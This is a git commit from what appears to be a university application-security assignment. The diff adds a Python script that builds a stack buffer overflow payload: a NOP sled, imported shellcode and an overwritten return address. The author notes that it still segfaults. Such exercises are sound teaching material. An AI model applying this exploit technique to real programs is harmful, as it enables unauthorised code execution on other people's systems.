032e4f3042a7642c4bad08f4294b89f41633b772
Birkhoff <zhiqic2@illinois.edu>
2021-02-03 23:58:20 +0800

    Prototype for 1.2.7
    Build nop sled, and return pointer points to the max buffer start address. Should work, but somehow segfaults

--- AppSec/1.2.7.py
+++ AppSec/1.2.7.py
@@ -5,3 +5,11 @@ from shellcode import shellcode
 from struct import pack
 
 # Your code here
+pad = 1024 + 12
+shellcode_addr = 0xfffed2e0
+
+payload = b'\x90' * (pad - len(shellcode))
+payload += shellcode
+payload += pack('<I', shellcode_addr)
+
+sys.stdout.buffer.write(payload)
